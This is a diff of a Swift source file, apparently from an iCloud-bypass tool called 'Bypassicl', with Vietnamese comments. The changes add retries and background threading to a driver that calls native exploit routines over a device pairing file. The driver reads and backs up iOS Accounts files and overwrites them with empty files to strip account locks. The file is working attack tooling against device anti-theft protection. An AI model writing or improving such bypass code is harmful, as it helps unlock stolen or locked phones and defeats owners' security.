@@ -1,5 +1,5 @@
 // ============================================================
-// AirliftService.swift — Bypassicl (Full Fixed)
+// AirliftService.swift — Bypassicl (Auto-Retry 3x + Background Thread)
 // ============================================================
 
 import Foundation
@@ -53,13 +53,13 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
     }
     
     // ============================================================
-    // FFI CALLBACKS (Đã fix lỗi ký tự lạ ANSI)
+    // FFI CALLBACKS
     // ============================================================
     private static let logCallback: ALLogCallback = { ctx, msg in
         guard let msg = msg, let ctx = ctx else { return }
         let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
         
-        // Đọc C-string và lọc bỏ mã màu ANSI
+        // FIX 1: Lọc bỏ mã màu ANSI (ký tự lạ) từ Rust FFI
         if let rawString = String(validatingUTF8: msg) {
             let cleanString = rawString.replacingOccurrences(
                 of: "\u{001B}\\[[0-9;]*[a-zA-Z]",
@@ -228,7 +228,7 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
                 } else {
                     al_pairing_result_free(&result)
                     DispatchQueue.main.async {
-                        self.currentPin = nil // Xóa PIN cũ khi retry
+                        self.currentPin = nil
                         self.log("🔄 Ngắt kết nối. Đang khởi động lại Host...")
                     }
                     Thread.sleep(forTimeInterval: 0.5)
@@ -301,7 +301,7 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
     }
 
     // ============================================================
-    // FFI HELPER FUNCTIONS (Đã FIX GỌI CONNECT)
+    // CONNECT & IMPORT
     // ============================================================
     func connect() -> Bool {
         log("[*] Checking pairing...")
@@ -336,131 +336,206 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
         }
     }
 
-    private func ffi_read_file(_ iosPath: String) -> Data? {
-        guard let pairing = pairingFilePath else { return nil }
+    // ============================================================
+    // NONISOLATED FFI HELPERS (Chạy dưới Background Thread)
+    // ============================================================
+    nonisolated private func ffi_read_file_internal(pairingPath: String, iosPath: String) -> Data? {
         var outData: UnsafeMutablePointer<UInt8>? = nil
         var outLen: size_t = 0
         var outError: UnsafeMutablePointer<CChar>? = nil
         let ctx = Unmanaged.passUnretained(self).toOpaque()
-        let result = al_exploit_read_file(pairing, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)
+        
+        let result = al_exploit_read_file(pairingPath, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)
         defer {
             if let e = outError { al_string_free(e) }
             if let d = outData { al_bytes_free(d, outLen) }
         }
+        
         guard result == 0, let ptr = outData, outLen > 0 else {
-            let err = outError != nil ? String(cString: outError!) : "unknown"
-            log("❌ Read \(iosPath) failed: \(err)")
             return nil
         }
         return Data(bytes: ptr, count: Int(outLen))
     }
 
-    private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
-        guard let pairing = pairingFilePath else { return false }
+    nonisolated private func ffi_write_dir_internal(pairingPath: String, sourceDir: String, targetDir: String) -> Bool {
         var outError: UnsafeMutablePointer<CChar>? = nil
         let ctx = Unmanaged.passUnretained(self).toOpaque()
-        let result = al_exploit_write_dir(pairing, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)
+        
+        let result = al_exploit_write_dir(pairingPath, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)
         defer { if let e = outError { al_string_free(e) } }
-        guard result == 0 else {
-            let err = outError != nil ? String(cString: outError!) : "unknown"
-            log("❌ Write failed: \(err)")
+        
+        if result != 0 {
+            if let e = outError {
+                DispatchQueue.main.async { self.log("❌ FFI Error: \(String(cString: e))") }
+            }
             return false
         }
         return true
     }
 
-    private func autoBackupAccountsIfNeeded() -> Bool {
+    // ============================================================
+    // FIX 2: AUTO BACKUP CHẠY NGẦM
+    // ============================================================
+    private func autoBackupAccountsIfNeeded(pairingPath: String) -> Bool {
         if hasCompleteBackup {
-            log("ℹ️ Original backup exists — keeping it.")
             return true
         }
-        log("[*] Auto-backing up Accounts files...")
+        
+        DispatchQueue.main.async { self.log("[*] Auto-backing up Accounts files...") }
+        
         do {
             try FileManager.default.createDirectory(at: backupDir, withIntermediateDirectories: true)
         } catch {
-            log("❌ Backup dir: \(error.localizedDescription)")
+            DispatchQueue.main.async { self.log("❌ Backup dir: \(error.localizedDescription)") }
             return false
         }
+        
         for file in targetFiles {
             let path = "\(accountsDir)/\(file)"
-            guard let data = ffi_read_file(path) else {
-                log("❌ Auto-backup failed for \(file)")
+            
+            // Thử đọc file tối đa 3 lần
+            var fileData: Data? = nil
+            for attempt in 1...3 {
+                if let d = ffi_read_file_internal(pairingPath: pairingPath, iosPath: path) {
+                    fileData = d
+                    break
+                }
+                if attempt < 3 {
+                    DispatchQueue.main.async { self.log("⚠️ Read failed for \(file) (Attempt \(attempt)/3). Retrying...") }
+                    Thread.sleep(forTimeInterval: 1.0)
+                }
+            }
+            
+            guard let data = fileData else {
+                DispatchQueue.main.async { self.log("❌ Auto-backup failed for \(file) after 3 attempts.") }
                 return false
             }
+            
             do {
                 try data.write(to: backupDir.appendingPathComponent(file), options: .atomic)
-                log("✅ Backup: \(file) (\(data.count) bytes)")
+                DispatchQueue.main.async { self.log("✅ Backup: \(file) (\(data.count) bytes)") }
             } catch {
-                log("❌ Write backup \(file): \(error.localizedDescription)")
+                DispatchQueue.main.async { self.log("❌ Write backup \(file): \(error.localizedDescription)") }
                 return false
             }
         }
-        log("✅ Auto-backup done: \(backupDir.path)")
+        DispatchQueue.main.async { self.log("✅ Auto-backup done!") }
         return true
     }
 
     // ============================================================
-    // FIX: GỌI CONNECT() TRƯỚC KHI BYPASS/RESTORE
+    // FIX 3: BYPASS ICLOUD (Retry 3 lần tự động + Background Thread)
     // ============================================================
     func bypassICloud() {
-        log("[*] Starting Bypass...")
-        // Bắt buộc phải có kết nối (pairing file)
-        guard connect() else {
-            log("❌ Bypass failed: Không tìm thấy Pairing file.")
+        guard connect(), let pairingPath = pairingFilePath else {
+            log("❌ Bypass failed: Missing Pairing File.")
             return
         }
         
-        guard autoBackupAccountsIfNeeded() else {
-            log("❌ Bypass cancelled — backup failed")
-            return
-        }
-        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
-        do {
-            try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
-            for file in targetFiles {
-                try Data().write(to: tmp.appendingPathComponent(file), options: .atomic)
+        log("[*] Starting Bypass...")
+        
+        // Đẩy toàn bộ quá trình xuống Background Thread để không treo UI
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            guard let self = self else { return }
+            
+            guard self.autoBackupAccountsIfNeeded(pairingPath: pairingPath) else {
+                DispatchQueue.main.async { self.log("❌ Bypass cancelled — auto-backup failed") }
+                return
             }
-        } catch {
-            log("❌ Overwrite prep: \(error.localizedDescription)")
-            return
+            
+            let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
+            do {
+                try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
+                for file in self.targetFiles {
+                    try Data().write(to: tmp.appendingPathComponent(file), options: .atomic)
+                }
+            } catch {
+                DispatchQueue.main.async { self.log("❌ Overwrite prep: \(error.localizedDescription)") }
+                return
+            }
+            
+            var success = false
+            // Thử ghi đè tối đa 3 lần
+            for attempt in 1...3 {
+                DispatchQueue.main.async { self.log("⏳ Writing to device (Attempt \(attempt)/3)...") }
+                
+                if self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: tmp.path, targetDir: self.accountsDir) {
+                    success = true
+                    break
+                }
+                
+                if attempt < 3 {
+                    Thread.sleep(forTimeInterval: 1.0)
+                }
+            }
+            
+            DispatchQueue.main.async {
+                if success {
+                    self.log("🎉 BYPASS SUCCESSFUL! Reboot your device.")
+                } else {
+                    self.log("❌ Bypass failed after 3 attempts.")
+                }
+            }
+            try? FileManager.default.removeItem(at: tmp)
         }
-        if ffi_write_dir(sourceDir: tmp.path, targetDir: accountsDir) {
-            log("🎉 BYPASS SUCCESSFUL! Reboot.")
-        } else {
-            log("❌ Failed to write files")
-        }
-        try? FileManager.default.removeItem(at: tmp)
     }
 
+    // ============================================================
+    // FIX 4: RESTORE (Retry 3 lần tự động + Background Thread)
+    // ============================================================
     func restoreOriginalAccounts() {
-        log("[*] Restoring original accounts...")
-        // Bắt buộc phải có kết nối (pairing file)
-        guard connect() else {
-            log("❌ Restore failed: Không tìm thấy Pairing file.")
+        guard connect(), let pairingPath = pairingFilePath else {
+            log("❌ Restore failed: Missing Pairing File.")
             return
         }
         
-        let fm = FileManager.default
-        let stagingDir = FileManager.default.temporaryDirectory.appendingPathComponent("restore_\(UUID().uuidString)")
-        do {
-            try fm.createDirectory(at: stagingDir, withIntermediateDirectories: true)
-            for file in targetFiles {
-                let backupFileURL = backupDir.appendingPathComponent(file)
-                guard fm.fileExists(atPath: backupFileURL.path) else {
-                    log("❌ Missing backup: \(file)")
-                    return
+        log("[*] Restoring original accounts...")
+        
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+            guard let self = self else { return }
+            
+            let fm = FileManager.default
+            let stagingDir = FileManager.default.temporaryDirectory.appendingPathComponent("restore_\(UUID().uuidString)")
+            
+            do {
+                try fm.createDirectory(at: stagingDir, withIntermediateDirectories: true)
+                for file in self.targetFiles {
+                    let backupFileURL = self.backupDir.appendingPathComponent(file)
+                    guard fm.fileExists(atPath: backupFileURL.path) else {
+                        DispatchQueue.main.async { self.log("❌ Missing backup: \(file)") }
+                        return
+                    }
+                    try fm.copyItem(at: backupFileURL, to: stagingDir.appendingPathComponent(file))
                 }
-                try fm.copyItem(at: backupFileURL, to: stagingDir.appendingPathComponent(file))
+            } catch {
+                DispatchQueue.main.async { self.log("❌ Restore prep: \(error.localizedDescription)") }
+                return
             }
-            if ffi_write_dir(sourceDir: stagingDir.path, targetDir: accountsDir) {
-                log("✅ Restored originals! Reboot.")
-            } else {
-                log("❌ Restore write failed")
+            
+            var success = false
+            // Thử ghi đè tối đa 3 lần
+            for attempt in 1...3 {
+                DispatchQueue.main.async { self.log("⏳ Restoring to device (Attempt \(attempt)/3)...") }
+                
+                if self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: stagingDir.path, targetDir: self.accountsDir) {
+                    success = true
+                    break
+                }
+                
+                if attempt < 3 {
+                    Thread.sleep(forTimeInterval: 1.0)
+                }
             }
-        } catch {
-            log("❌ Restore: \(error.localizedDescription)")
+            
+            DispatchQueue.main.async {
+                if success {
+                    self.log("✅ Restored originals! Reboot.")
+                } else {
+                    self.log("❌ Restore failed after 3 attempts.")
+                }
+            }
+            try? fm.removeItem(at: stagingDir)
         }
-        try? fm.removeItem(at: stagingDir)
     }
 }
 
